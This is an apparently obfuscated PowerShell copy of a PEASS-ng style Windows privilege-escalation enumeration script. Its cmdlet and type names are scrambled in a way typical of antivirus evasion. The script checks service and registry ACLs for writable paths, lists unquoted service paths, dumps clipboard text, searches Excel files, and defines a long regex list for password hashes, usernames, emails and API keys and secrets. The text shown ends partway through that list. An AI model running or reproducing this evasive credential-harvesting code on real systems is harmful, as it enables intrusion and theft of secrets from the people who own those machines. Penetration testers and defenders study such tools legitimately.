  sET-varIable ('7'+'xi')  ([TYpE]("{8}{6}{3}{4}{9}{2}{7}{5}{0}{1}" -f 'tErOPSERvicES.MARShA','L','IMe.','.ru','n','n','steM','I','sY','t') )  ; $z4ECau =[TYPe]('Gc')  ;Set nmWDe  (  [tyPE]("{5}{3}{0}{6}{1}{4}{7}{2}"-F'M','iaGnoStICS.st','h','Te','OpwAT','SYs','.D','C'));   Set-VARiABLE ('h'+'3a') (  [tyPe]("{1}{0}"-f'H','MaT') ) ; sET-item  VaRIaBlE:qfEH3W ([type]("{5}{2}{8}{6}{7}{3}{0}{4}{1}"-F'Y.prOtEC','aTA','steM.sEC','RYpTOGRAPH','TEDd','sY','I','ty.c','UR') ) ; $yATRD = [TYPE]("{8}{2}{1}{5}{3}{6}{7}{9}{0}{10}{11}{4}" -f '.D','M.SEcU','TE','ty.cRyPt','E','ri','O','grap','SYs','HY','aT','aPRoTEctioNsCOp')  ;   set-iTEM  ("VarI"+"Ab"+"Le:fwT3y") ([TyPe]("{0}{5}{6}{4}{2}{3}{1}" -F'Sy','DIng','n','Co','E','STem.TeXt','.')  )  ;



[CmdletBinding()]
param(
  [switch]${TIME`s`Ta`MP},
  [switch]${F`Ull`ChecK},
  [switch]${E`xc`EL}
)


function R`eTUr`N`Ho`TfIXiD {
  param(
    [string]${tI`TLE}
  )
  
  if ((${T`ITLE} | &("{1}{2}{0}"-f'ing','Select','-Str') -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value) {
    return ((${TiT`Le} | &("{0}{1}{3}{2}" -f'Se','l','-String','ect') -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value)
  }
  elseif ((${TIt`le} | &("{1}{0}{2}" -f 'l','Se','ect-String') -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value) {
    return ((${tit`le} | &("{1}{2}{0}"-f 'ct-String','S','ele') -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value)
  }
}

Function s`TaRt-A`c`l`CHEck {
  param(
    ${T`ARgET}, ${S`ErvIce`NA`ME})
  
  if (${NU`LL} -ne ${tA`RG`eT}) {
    try {
      ${Acl`OBJ`ecT} = &("{2}{0}{1}"-f'et-A','cl','G') ${tA`RGeT} -ErrorAction ("{2}{0}{1}{3}{4}" -f'ntlyC','o','Sile','nti','nue')
    }
    catch { ${n`ULl} }
    
    
    if (${aCl`objE`cT}) { 
      ${i`DE`Nt`ITY} = @()
      ${Id`ENt`ity} += "$env:COMPUTERNAME\$env:USERNAME"
      if (${AC`lO`Bj`ecT}.Owner -like ${I`DENti`Ty} ) { &("{1}{0}{2}"-f'Ho','Write-','st') ("$Identity "+'h'+'as '+'owne'+'rshi'+'p '+'o'+'f '+"$Target") -ForegroundColor ("{0}{1}" -f'Re','d') }
      &("{1}{0}{2}"-f 'mi','whoa','.exe') ("{2}{1}{0}"-f 'ps','rou','/g') ("{1}{0}" -f 'o','/f') ("{0}{1}" -f 'cs','v') | &("{2}{1}{3}{0}" -f 'v','ertFrom-','Conv','Cs') | &("{3}{0}{1}{2}"-f 'je','c','t','Select-Ob') -ExpandProperty ("{0}{2}{1}"-f 'g','p name','rou') | &("{0}{1}{4}{3}{2}" -f 'Fo','rEach-','ject','b','O') { ${iDe`NTi`TY} += ${_} }
      ${iD`e`NtiTy`FoUNd} = ${fA`l`Se}
      foreach (${I} in ${Id`en`TI`Ty}) {
        ${pErMIS`si`ON} = ${aClob`Je`CT}.Access | &("{2}{3}{0}{1}" -f '-O','bject','Whe','re') { ${_}.IdentityReference -like ${i} }
        ${u`SeR`pe`RMIS`SiON} = ""
        switch -WildCard (${per`miSSI`On}.FileSystemRights) {
          ("{1}{0}{2}"-f 'tro','FullCon','l') { ${USER`p`eRM`IssIon} = ("{2}{0}{1}"-f'ntr','ol','FullCo'); ${iDEnTi`T`YfO`Und} = ${T`Rue} }
          ("{2}{0}{1}"-f 'rit','e*','W') { ${USER`P`eRmission} = ("{0}{1}" -f 'Wri','te'); ${IDe`Nt`ITY`FouND} = ${t`RUE} }
          ("{1}{0}" -f 'ify','Mod') { ${Use`R`peRmI`sS`Ion} = ("{0}{2}{1}" -f 'M','y','odif'); ${iDenTiT`yf`oUNd} = ${T`RUe} }
        }
        Switch (${P`ermi`SsiOn}.RegistryRights) {
          ("{2}{0}{1}"-f'ull','Control','F') { ${US`erPER`MIs`Si`on} = ("{1}{2}{0}" -f'ol','FullCo','ntr'); ${IDEn`Ti`TyfouND} = ${tr`UE} }
        }
        if (${U`Se`RpEr`Mission}) {
          if (${SEr`Vi`c`ename}) { &("{2}{0}{1}"-f'rite-H','ost','W') ("$ServiceName "+'fo'+'und '+'wi'+'th '+'perm'+'issions'+' '+'iss'+'ue:') -ForegroundColor ("{0}{1}"-f'Re','d') }
          &("{2}{0}{1}" -f's','t','Write-Ho') -ForegroundColor ("{1}{0}"-f'ed','r')  "Identity $($permission.IdentityReference) has '$userPermission' perms for $Target "
        }
      }    
      
      if (${ID`EnT`iTy`FOuND} -eq ${F`Alse}) {
        if (${TA`R`GEt}.Length -gt 3) {
          ${TAr`gEt} = &("{1}{2}{0}" -f'th','S','plit-Pa') ${Ta`RG`eT}
          &("{2}{3}{4}{0}{1}" -f 'c','k','Start-','AC','LChe') ${tArG`ET} -ServiceName ${sEr`V`I`ceNAME}
        }
      }
    }
    else {
      
      ${t`AR`GeT} = &("{0}{2}{1}"-f 'Split','h','-Pat') ${TARG`Et}
      &("{0}{2}{1}{3}{4}" -f 'S','t-A','tar','C','LCheck') ${T`AR`GET} ${SErviC`E`NA`mE}
    }
  }
}

Function un`q`UOT`eDseRv`IcEPAthC`he`cK {
  &("{2}{0}{1}"-f'ite','-Host','Wr') ("{2}{13}{10}{4}{14}{5}{3}{1}{15}{16}{7}{0}{12}{11}{8}{9}{6}" -f 'is ','rvic','Fetc',' se','e list ','f','...','h','il','e','ng th','y take a wh','ma','hi','o','es, ','t');
  ${S`Erv`ICes} = &("{3}{0}{2}{1}" -f 'W','ct','miObje','Get-') -Class ("{3}{0}{1}{2}" -f'n32_S','ervi','ce','Wi') | &("{1}{2}{0}" -f 't','Where-Obje','c') { ${_}.PathName -inotmatch "`"" -and ${_}.PathName -inotmatch ((("{3}{2}{1}{0}"-f '0','0eN','seN',':eN0eN0Window')).rEplacE(([ChaR]101+[ChaR]78+[ChaR]48),'\')) -and (${_}.StartMode -eq ("{0}{1}" -f 'Au','to') -or ${_}.StartMode -eq ("{1}{0}"-f'anual','M')) -and (${_}.State -eq ("{0}{1}"-f 'R','unning') -or ${_}.State -eq ("{1}{0}"-f'd','Stoppe')) };
  if ($(${SE`RVI`cES} | &("{3}{1}{2}{0}" -f'-Object','easur','e','M')).Count -lt 1) {
    &("{1}{0}{2}" -f'Ho','Write-','st') ("{2}{3}{5}{4}{6}{1}{0}" -f 'were found','hs ','No',' u','ed servic','nquot','e pat');
  }
  else {
    ${SER`VICeS} | &("{2}{0}{3}{1}"-f 'Each','ject','For','-Ob') {
      &("{3}{1}{2}{0}"-f 'ost','rit','e-H','W') ("{4}{0}{1}{2}{3}{5}"-f'n','qu','oted Service Pat','h foun','U','d!') -ForegroundColor ("{0}{1}"-f'r','ed')
      &("{1}{2}{0}"-f '-Host','W','rite') ("{0}{1}" -f 'N','ame:') ${_}.Name
      &("{1}{0}{3}{2}" -f 'H','Write-','t','os') ("{0}{2}{1}" -f 'PathNa','e:','m') ${_}.PathName
      &("{0}{1}{3}{2}" -f'Wr','ite-H','st','o') ("{0}{2}{1}"-f'Sta','me:','rtNa') ${_}.StartName 
      &("{2}{1}{0}" -f '-Host','ite','Wr') ("{1}{0}{2}"-f'a','St','rtMode:') ${_}.StartMode
      &("{1}{0}{2}"-f'ite-','Wr','Host') ("{2}{0}{1}"-f 'u','nning:','R') ${_}.State
    } 
  }
}

function tIm`e`ELApseD { &("{1}{2}{0}"-f'st','Writ','e-Ho') "Time Running: $($stopwatch.Elapsed.Minutes):$($stopwatch.Elapsed.Seconds) " }
Function G`eT-Cli`P`BOa`RdtEXT {
  &("{0}{2}{1}" -f 'A','d-Type','d') -AssemblyName ("{1}{2}{3}{4}{0}"-f're','Prese','nt','ati','onCo')
  ${T`eXT} = [Windows.Clipboard]::GetText()
  if (${tE`XT}) {
    &("{2}{0}{1}" -f'Hos','t','Write-') ""
    if (${TimEs`TA`MP}) { &("{2}{0}{3}{1}"-f'E','ed','Time','laps') }
    &("{2}{1}{0}"-f't','-Hos','Write') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{1}{3}{2}{0}{5}{4}" -f ' Cli','=','B5dB','========5d','Board text found:','p')).rePlacE('5dB',[sTRiNg][Char]124))
    &("{2}{1}{0}"-f 't','te-Hos','Wri') ${te`XT}
    
  }
}

Function SEar`CH`-Exc`el {
  [cmdletbinding()]
  Param (
      [parameter(Mandatory, ValueFromPipeline)]
      [ValidateScript({
          Try {
              If (&("{2}{0}{1}"-f'P','ath','Test-') -Path ${_}) {${TR`UE}}
              Else {Throw "$($_) is not a valid path! "}
          }
          Catch {
              Throw ${_}
          }
      })]
      [string]${SO`U`RCE},
      [parameter(Mandatory)]
      [string]${sEa`RcHt`Ext}
      
  )
  ${eXc`EL} = &("{2}{0}{1}" -f 'c','t','New-Obje') -ComObject ("{0}{2}{1}{3}"-f'Exc','ti','el.Applica','on')
  Try {
      ${SO`U`Rce} = &("{0}{3}{2}{1}" -f 'Con','h','t','vert-Pa') ${s`OUrcE}
  }
  Catch {
      &("{1}{2}{0}" -f'g','Write-Wa','rnin') "Unable locate full path of $($Source) "
      BREAK
  }
  ${WorK`Bo`ok} = ${e`xC`el}.Workbooks.Open(${so`UrcE})
  ForEach (${wor`ks`heet} in @(${W`oRKB`ook}.Sheets)) {
      
      ${f`oUNd} = ${WoR`KS`heeT}.Cells.Find(${sear`C`h`TEXT})
      If (${F`oUND}) {
        try{  
          
          &("{1}{2}{0}" -f 't','Writ','e-Hos') ('Pa'+'ttern:'+' '+"'$SearchText' "+'f'+'ound '+'in'+' '+"$source") -ForegroundColor ("{1}{0}" -f 'lue','B')
          ${begin`A`d`drEsS} = ${f`oUnD}.Address(0,0,1,1)
          
          [pscustomobject]@{
              WorkSheet = ${WorKs`HE`ET}.Name
              Column = ${FO`UND}.Column
              Row =${F`ounD}.Row
              TextMatch = ${f`oUND}.Text
              Address = ${b`egin`A`Ddr`Ess}
          }
          Do {
              ${Fou`ND} = ${workS`He`Et}.Cells.FindNext(${f`OunD})
              ${aDD`RE`sS} = ${f`o`UNd}.Address(0,0,1,1)
              If (${aDDr`E`ss} -eq ${beG`Inad`DR`esS}) {
                &("{0}{1}{3}{2}"-f 'Wri','te-h','t','os') ("{3}{0}{1}{4}{6}{8}{7}{2}{5}"-f'dd','ress is same a','s','A','s','s',' Beg','dre','in Ad')
                  BREAK
              }
              [pscustomobject]@{
                  WorkSheet = ${w`oRK`sHeeT}.Name
                  Column = ${FO`UND}.Column
                  Row =${Fo`UnD}.Row
                  TextMatch = ${Fo`Und}.Text
                  Address = ${AdD`R`ESs}
              }                 
          } Until (${f`AL`sE})
        }
        catch {
          
        }
      }
      
      
      
  }
  try{
  ${W`ork`BooK}.close(${FA`LsE})
  [void] (Gci ("V"+"ArI"+"ABl"+"e:7xi") ).VAlue::ReleaseComObject([System.__ComObject]${E`XcEL})
    $z4ecAU::Collect()
    ( GEt-varIAbLe Z4EcaU  ).VAlUE::WaitForPendingFinalizers()
  }
  catch{
    
  }
  &("{3}{0}{4}{1}{2}"-f'ov','ariabl','e','Rem','e-V') ("{1}{0}" -f'l','exce') -ErrorAction ("{0}{3}{4}{2}{1}" -f'S','nue','onti','ile','ntlyC')
}

function Wr`iTE-cO`L`or([String[]]${Te`xT}, [ConsoleColor[]]${C`oL`Or}) {
  for (${i} = 0; ${i} -lt ${T`eXT}.Length; ${i}++) {
    &("{2}{3}{1}{0}" -f't','-Hos','Writ','e') ${t`EXT}[${I}] -Foreground ${CoL`Or}[${I}] -NoNewline
  }
  &("{1}{0}{3}{2}"-f'te','Wri','Host','-')
}


&("{0}{2}{3}{1}"-f 'W','r','rite-C','olo') ((("{2}{8}{3}{6}{7}{0}{1}{5}{4}{9}" -f'(','(',',','*(','(((','(((((','(((','(((((','/*,..','((((((((((((((,'))) -Color ("{0}{1}" -f'Gr','een')
&("{2}{1}{0}" -f'or','te-Col','Wri') ((("{3}{8}{7}{5}{9}{2}{0}{1}{4}{6}" -f'*',', ','.*//((//*',',','.*','((((((((((((((((/, ','((((((*','/((','*',' '))) -Color ("{0}{1}"-f'Gr','een')
&("{1}{0}{2}"-f'ol','Write-C','or') ((("{0}{2}{1}{3}" -f'(','((((((((((','((','((('))), ("{2}{0}{1}" -f '*,',',,','* ****'), ((("{3}{5}{2}{4}{0}{1}{6}" -f'(*',' ,(((','#####','y3x####',' .','#','(((')).rEplAcE(([cHar]121+[cHar]51+[cHar]120),'\')) -Color ("{0}{1}"-f 'Gr','een'), ("{1}{0}" -f'e','Blu'), ("{1}{0}" -f'reen','G')
&("{2}{1}{0}" -f'r','Colo','Write-') ((("{2}{1}{0}"-f '(((','(((','((((('))), ("{4}{3}{2}{0}{1}" -f'****','**********','**','*','/**'), ((("{2}{1}{0}{3}"-f'(',' .(. ((','#######','((('))) -Color ("{0}{1}" -f 'Gr','een'), ("{1}{0}"-f'lue','B'), ("{1}{0}"-f'en','Gre')
&("{2}{3}{1}{0}" -f 'Color','e-','W','rit') ((("{2}{1}{0}" -f '(','((','(((('))), ("{1}{5}{3}{0}{2}{4}" -f'********','/*','**','*','****','**'), ("{2}{1}{0}" -f'@/','@@@@','/'), "***", (((("{0}{3}{2}{1}" -f '3eS#####','(((','#3eS(((','#')) -cRepLaCe  ([ChAr]51+[ChAr]101+[ChAr]83),[ChAr]92)) -Color ("{1}{0}" -f'een','Gr'), ("{1}{0}" -f'lue','B'), ("{0}{1}" -f'Wh','ite'), ("{0}{1}"-f'Bl','ue'), ("{1}{0}"-f'reen','G')
&("{2}{1}{0}" -f 'olor','-C','Write') ("{1}{0}"-f '..',',,'), ("{1}{4}{0}{3}{2}"-f '***','***','*********','****','***'), ("{1}{0}{2}" -f '@','/@@','@@@@@@/'), "***", (((("{0}{1}{2}{4}{3}" -f',#####.','D8O','/(((','(','(')) -REpLACE ([ChaR]68+[ChaR]56+[ChaR]79),[ChaR]92)) -Color ("{1}{0}" -f 'reen','G'), ("{1}{0}" -f'ue','Bl'), ("{1}{0}"-f 'te','Whi'), ("{1}{0}"-f'e','Blu'), ("{0}{1}" -f 'Gre','en')
&("{3}{0}{2}{1}"-f '-','or','Col','Write') ", ,", ("{0}{3}{2}{4}{1}" -f '*****','****','**********','**','*'), ("{2}{0}{1}" -f '@@@','@+@@@/','/@'), ("{1}{0}{3}{2}" -f '*','*','*','******'), ((("{3}{1}{2}{0}"-f'(','(/ /','(((','##('))) -Color ("{0}{1}"-f 'Gr','een'), ("{1}{0}"-f'ue','Bl'), ("{1}{0}" -f'e','Whit'), ("{0}{1}"-f 'Bl','ue'), ("{0}{1}"-f 'G','reen')
&("{0}{1}{2}{3}"-f 'W','rite-Col','o','r') ((("{3}{0}{1}{4}{2}" -f'(##','####','##','..((','##'))), ("{0}{1}{2}" -f '*','****','****'), ("{0}{3}{2}{1}"-f '/#@@@@','@/','@@','@@'), ("{2}{0}{1}{3}"-f'*','********','**','**'), ((("{1}{2}{0}"-f'..((((',',',','))) -Color ("{0}{1}"-f'Gre','en'), ("{1}{0}"-f 'e','Blu'), ("{0}{1}" -f'Whi','te'), ("{1}{0}"-f'lue','B'), ("{1}{0}"-f'n','Gree')
&("{1}{0}{2}"-f 'e-Col','Writ','or') ((("{4}{2}{0}{3}{1}" -f'###','##########(/','#','##','.((('))), ("{1}{0}" -f '****','**'), ("{1}{2}{0}"-f'@@@@/','/','@'), ("{0}{3}{1}{2}" -f'*********','*','***','***'), ((("{2}{1}{0}" -f'((','. /','.'))) -Color ("{0}{1}"-f'Gree','n'), ("{1}{0}"-f'e','Blu'), ("{1}{0}" -f'e','Whit'), ("{1}{0}" -f 'ue','Bl'), ("{0}{1}" -f 'Gre','en')
&("{1}{2}{3}{0}"-f 'lor','Writ','e','-Co') ((("{1}{7}{3}{6}{5}{2}{8}{0}{4}"-f '###(','.((##','#####','########','/','###','#','#','#'))), ("{1}{2}{0}{5}{4}{3}"-f'*******','*****','***','******','**','*'), ((("{1}{0}"-f'*(','..'))) -Color ("{0}{1}" -f 'Gr','een'), ("{0}{1}" -f 'B','lue'), ("{0}{1}" -f'Gr','een')
&("{2}{0}{1}{3}"-f 'i','t','Wr','e-Color') ((("{0}{4}{5}{6}{3}{8}{2}{1}{7}" -f'.(','####','###','###','(###','######','##','######(/','##'))), ("{0}{2}{3}{1}"-f '****','**','***********','***'), ".,(" -Color ("{1}{0}"-f 'en','Gre'), ("{1}{0}"-f 'e','Blu'), ("{1}{0}"-f 'reen','G')
&("{0}{2}{1}" -f 'Write-C','or','ol') ((("{6}{1}{9}{5}{8}{2}{0}{3}{7}{10}{4}" -f '######','(#####','#','##','/','##','.(','###','#####','#','#########('))), ("{3}{2}{1}{0}"-f'******','**','****','***'), "..(" -Color ("{1}{0}"-f'een','Gr'), ("{1}{0}" -f'e','Blu'), ("{0}{1}" -f'Gr','een')
&("{2}{0}{1}{3}"-f 'rite','-Co','W','lor') ((("{7}{9}{1}{8}{4}{11}{2}{6}{10}{0}{5}{3}"-f '#############','########','#','/','##','#(','####','.','###','((####','#','#'))), ("{0}{2}{1}" -f '****','***','****'), "..(" -Color ("{0}{1}"-f 'Gr','een'), ("{1}{0}" -f'ue','Bl'), ("{0}{1}" -f'G','reen')
&("{1}{2}{0}" -f 'lor','Write','-Co') ((("{2}{0}{1}" -f'###','##','.((#'))), ((("{0}{1}"-f'(',',.***.,('))), ("{0}{4}{1}{2}{5}{3}"-f'#','##','##','####','######','####'), ((("{0}{1}"-f'(','..***'))), ((("{0}{3}{1}{2}"-f'(/****','*','*','***'))), "..(" -Color ("{1}{0}" -f 'reen','G'), ("{0}{1}" -f'Gr','een'), ("{0}{1}" -f'Gre','en'), ("{0}{1}"-f'Gre','en'), ("{0}{1}" -f 'Blu','e'), ("{0}{1}" -f 'Gree','n')
&("{2}{1}{0}" -f'lor','rite-Co','W') ((("{0}{1}{2}"-f'.(','(#','#####*'))), ((("{0}{1}{2}"-f '(###','#','(('))), ("{3}{2}{0}{1}"-f'####','######','########','#'), ((("{1}{0}"-f '##','((####'))), ((("{0}{1}{2}"-f '/(*','*****','**'))), "..(" -Color ("{0}{1}" -f'Gre','en'), ("{0}{1}" -f 'Gree','n'), ("{1}{0}"-f'n','Gree'), ("{1}{0}" -f'en','Gre'), ("{1}{0}" -f'e','Blu'), ("{0}{1}"-f'Gre','en')
&("{2}{1}{0}" -f '-Color','te','Wri') ((("{4}{1}{0}{3}{2}" -f '##','((########','####','####','.'))), ((("{0}{2}{1}{3}" -f'(','******','/*','***('))), ((("{2}{0}{4}{6}{3}{5}{1}"-f '##','*...(','#','#','#','###(*','########'))) -Color ("{0}{1}"-f'Gree','n'), ("{0}{1}" -f'Gr','een'), ("{0}{1}" -f 'Gr','een')
&("{3}{1}{0}{2}"-f'o','l','r','Write-Co') ((("{6}{5}{2}{1}{0}{4}{3}" -f '#','####','#','##','###########','((#','.('))), ((("{1}{0}"-f'**(','/*****'))), ((("{6}{2}{4}{0}{3}{1}{5}" -f'#','####.((','##','###','#','((','########'))) -Color ("{1}{0}" -f 'een','Gr'), ("{1}{0}" -f 'reen','G'), ("{0}{1}" -f'Gr','een')
&("{3}{2}{0}{1}" -f 'Col','or','e-','Writ') ((("{12}{13}{4}{7}{11}{14}{10}{1}{3}{8}{2}{5}{0}{9}{6}" -f'###','####','#########','#','#','#','/((','########','##','/  ','#######','######','.(((','((#','#'))) -Color ("{1}{0}" -f'reen','G')
&("{1}{0}{2}" -f'ite-Colo','Wr','r') ((("{6}{1}{15}{5}{12}{0}{16}{10}{11}{7}{14}{8}{9}{4}{13}{2}{3}"-f'#####','((((','###(..(((','((.','#','##','..','##','###','#######','#','#','#','#','########','(##','####'))) -Color ("{0}{1}"-f'Gree','n')
&("{0}{1}{2}{3}"-f'Wr','ite-C','ol','or') ((("{7}{10}{5}{1}{0}{12}{9}{6}{2}{11}{4}{3}{8}"-f '###########','####','########','.((((','#######( ','((((','##','.','((.','#','...(','###','#'))) -Color ("{0}{1}" -f 'Gr','een')
&("{2}{0}{1}"-f'rit','e-Color','W') ((("{2}{7}{1}{3}{0}{6}{5}{10}{4}{9}{8}{11}"-f'#','(((((##','...','###','#','####','#######','...','.','#######( ','########','(((((((.'))) -Color ("{0}{1}"-f'Gr','een')
&("{3}{0}{1}{2}" -f'it','e-','Color','Wr') ((("{8}{6}{7}{1}{2}{4}{3}{0}{9}{5}"-f'######','((. ,(##','#','########','######','(../(((((((((.','(','(((((','(','#####'))) -Color ("{0}{1}"-f 'G','reen')
&("{0}{2}{1}{3}"-f 'Wr','lo','ite-Co','r') ((("{5}{2}{8}{7}{10}{12}{3}{13}{6}{14}{9}{11}{4}{0}{1}" -f'((','(((.','/, ','#','((','  (((((((((','##','########',' ,#','..((','###','(','#','#','###(/'))) -Color ("{1}{0}" -f 'een','Gr')
&("{1}{0}{2}" -f'rit','W','e-Color') ((("{0}{5}{3}{6}{1}{2}{8}{9}{4}{7}" -f'        ','*/','////','(','/((((((((((','((((','((((/,.  ,','(.','/*',',. .'))) -Color ("{0}{1}" -f 'G','reen')
&("{1}{2}{3}{0}" -f 'olor','Wri','te','-C') ((("{6}{0}{3}{7}{1}{2}{5}{4}{8}"-f' ','(','((((',' ','((((','(','        ',' (((((((','((((((((((/'))) -Color ("{0}{1}"-f'Gre','en')
&("{2}{0}{1}{3}"-f'e-','Col','Writ','or') ("{3}{7}{4}{5}{2}{1}{9}{8}{6}{0}"-f 'onley','a','& R','  ','  by PEASS-n','g ','C','      ','dolph','n') -Color ("{1}{0}"-f'reen','G')






${Pa`s`SwORD} = ${t`RuE}
${U`s`ErNamE} = ${t`RUE}
${W`eb`AUTH} = ${T`RUe}

${rE`gEXSEaR`cH} = @{}

if (${P`ASs`WORD}) {
  ${RegE`xS`e`ARch}.add(("{2}{4}{1}{0}{3}"-f 'ord','sw','Simple P','s1','as'), ("{2}{0}{1}"-f'ss.','*[=:].+','pa'))
  ${reGE`xSe`ARch}.add(("{3}{2}{0}{1}"-f 'swords','2','mple Pas','Si'), ("{0}{1}{2}"-f'pwd.','*[=',':].+'))
  ${reGex`sE`ARcH}.add(("{2}{1}{0}" -f '5','D','Apr1 M'), '\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}')
  ${REG`e`Xse`Arch}.add(("{0}{2}{1}"-f'Apache ','HA','S'), "\{SHA\}[0-9a-zA-Z/_=]{10,}")
  ${REGExs`Ea`RCh}.add(("{2}{0}{1}" -f'lowfis','h','B'), '\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*')
  ${REG`E`xSEArcH}.add(("{0}{1}"-f'D','rupal'), '\$S\$[a-zA-Z0-9_/\.]{52}')
  ${rEg`EXsE`ARch}.add(("{1}{3}{2}{0}"-f 'tin','Joom','bulle','lav'), "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}")
  ${R`eG`EXsearCH}.add(("{1}{2}{0}" -f 'x MD5','Lin','u'), '\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}')
  ${rEGEX`sEa`RCH}.add(("{1}{0}"-f 'pbb3','ph'), '\$H\$[a-zA-Z0-9_/\.]{31}')
  ${REg`exseAR`ch}.add(("{1}{0}{2}"-f 'a','sh','512crypt'), '\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}')
  ${RE`gexS`eArCh}.add(("{1}{2}{0}"-f'ss','Wordp','re'), '\$P\$[a-zA-Z0-9_/\.]{31}')
  ${R`EGeXSe`ARCh}.add("md5", "(^|[^a-zA-Z0-9])[a-fA-F0-9]{32}([^a-zA-Z0-9]|$)")
  ${R`E`GEX`sEarch}.add(("{1}{0}"-f 'a1','sh'), "(^|[^a-zA-Z0-9])[a-fA-F0-9]{40}([^a-zA-Z0-9]|$)")
  ${r`egeXSe`A`Rch}.add(("{1}{2}{0}"-f'6','sh','a25'), "(^|[^a-zA-Z0-9])[a-fA-F0-9]{64}([^a-zA-Z0-9]|$)")
  ${rEG`eXseAr`CH}.add(("{0}{1}" -f 'sha','512'), "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)")  
  
  
  ${R`E`GExsEaR`CH}.add(("{0}{1}" -f 'Ba','se64'), "(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[a-zA-Z0-9+\/]+={0,2}")

}
if (${U`serN`A`mE}) {
  ${r`EgEXse`A`RCh}.add(("{2}{1}{0}" -f 's1','e','Usernam'), ("{0}{1}{2}" -f 'usernam','e[=:','].+'))
  ${re`gex`SEaRcH}.add(("{1}{2}{0}" -f 's2','User','name'), ("{0}{1}{2}{3}" -f 'u','ser','[=',':].+'))
  ${R`EG`EXsea`RCh}.add(("{2}{1}{0}" -f 'ames3','n','User'), ("{2}{1}{0}"-f'.+','=:]','login['))
  ${R`eg`Ex`seArCh}.add(("{0}{1}" -f'Email','s'), "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}")
  ${REg`e`xSeaRcH}.add(("{2}{0}{3}{1}"-f 's','dd','Net u','er a'), ("{1}{3}{2}{0}"-f 'dd','ne','er .+ /a','t us'))
}

if (${f`UL`lC`HeCK}) {
  ${reGeX`S`e`ARch}.add(("{2}{3}{1}{0}" -f'I Token','AP','Artifact','ory '), "AKC[a-zA-Z0-9]{10,}")
  ${rE`GEXSE`ARch}.add(("{4}{3}{0}{5}{2}{1}"-f'ifactory','d','Passwor','t','Ar',' '), "AP[0-9ABCDEF][a-zA-Z0-9]{8,}")
  ${rEG`exs`eaRch}.add(("{1}{2}{0}" -f'ey','Adaf','ruit API K'), "([a-z0-9_-]{32})")
  ${Re`Ge`X`SEArCH}.add(("{0}{3}{1}{2}" -f 'A','I Ke','y','dafruit AP'), "([a-z0-9_-]{32})")
  ${rEge`xs`eAr`CH}.add((("{1}{3}{4}{2}{5}{0}" -f 'Web)','Adobe Client','au',' Id (','O','th ')), "(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""]")
  ${REg`EXs`Ear`cH}.add(("{1}{5}{2}{3}{4}{0}"-f'cret','A','ode',' Clien','t Se','b'), "(p8e-)[a-z0-9]{32}")
  ${rEgE`x`seA`Rch}.add(("{0}{1}{2}"-f 'Ag','e Sec','ret Key'), "AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}")
  ${rEG`EXsE`A`Rch}.add(("{1}{0}{4}{3}{2}"-f'r','Ai','e API Key','bl','ta'), "([a-z0-9]{17})")
  ${ReGE`xS`Ea`RcH}.add(("{0}{2}{3}{1}"-f 'A','mi API Key','l','che'), "(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9-]{32})['""]")
  ${Rege`XS`eaRcH}.add(("{1}{3}{5}{2}{4}{0}{6}"-f' Pas','Art','API','ifac',' Key &','tory ','sword'), "[""']AKC[a-zA-Z0-9]{10,}[""']|[""']AP[0-9ABCDEF][a-zA-Z0-9]{8,}[""']")
  ${re`GE`xSea`RCh}.add(("{2}{0}{4}{1}{3}"-f 'las',' API K','At','ey','sian'), "(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{24})['""]")
  ${RE`GE`Xs`EArch}.add(("{0}{3}{1}{2}" -f'Binanc',' API K','ey','e'), "(binance[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{64})['""]")
  ${RE`gE`xsEarch}.add(("{3}{1}{0}{2}"-f' Clien','tbucket','t Id','Bi'), "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  ${rEg`eXs`eaRcH}.add(("{4}{5}{1}{2}{3}{0}" -f'et','lien','t S','ecr','Bitbucke','t C'), "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9_\-]{64})['""])")
  ${REg`E`X`SEarcH}.add(("{0}{5}{1}{2}{3}{4}" -f'B','t','co','inAverage API K','ey','i'), "(bitcoin.?average[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{43})['""]")
  ${R`eGexsE`A`RCH}.add(("{1}{2}{0}"-f 'I Key','Bitq','uery AP'), "(bitquery[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9]{32})['""]")
  ${re`g`EXseaRCh}.add(("{4}{6}{3}{2}{5}{0}{1}" -f 'd Acces','s Key','s K','s','Bittrex','ey an',' Acce'), "([a-z0-9]{32})")
  ${r`egeX`SeAR`cH}.add(("{1}{4}{2}{0}{3}"-f ' Ke','Bi','PI','y','rise A'), "(bitrise[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9_\-]{86})['""]")
